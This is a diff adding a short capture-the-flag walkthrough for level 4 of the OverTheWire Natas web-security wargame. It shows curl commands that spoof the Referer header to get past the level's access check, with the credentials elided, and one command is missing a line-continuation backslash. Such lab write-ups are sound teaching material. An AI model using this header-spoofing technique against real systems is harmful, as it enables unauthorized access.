@@ -1,0 +1,34 @@
+Level 4
+-------
+
+We got an "access disallowed" error because we were visiting
+from "", while authorized users should come from natas5.
+If that doesn't clue you in, try the "Refresh page" link. Now
+the page says we came from natas4. This is the `Referer` (sic)
+header. But that's information provided by the client, and
+we control the client. We can put whatever we want in that
+header. So, let's put natas5, as they kindly suggested.
+
+Hit CTRL-J, find the request to `index.php`, right-click, and
+select "Copy as CURL". This will give you the command line
+command to have curl execute the exact same request. Now, we
+just look for the `Referer` header, and change it. Don't forget
+to change the `Accept-Encoding` header, or you'll receive
+gzipped binary junk.
+
+    curl "http://natas4.natas.labs.overthewire.org/index.php" \
+        -H "Authorization: Basic ..." \
+        -H "DNT: 1" \
+        -H "Host: natas4.natas.labs.overthewire.org" \
+        -H "Accept-Language: en-GB,en-US;q=0.8,en;q=0.6" \
+        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36" \
+        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        -H "Referer: http://natas5.natas.labs.overthewire.org/" \
+        -H "Connection: keep-alive" \
+        -H "Cache-Control: max-age=0"
+
+Alternatively, just do:
+
+    curl "http://natas4.natas.labs.overthewire.org/index.php" \
+        -e "http://natas5.natas.labs.overthewire.org/" \
+        -u natas4:...
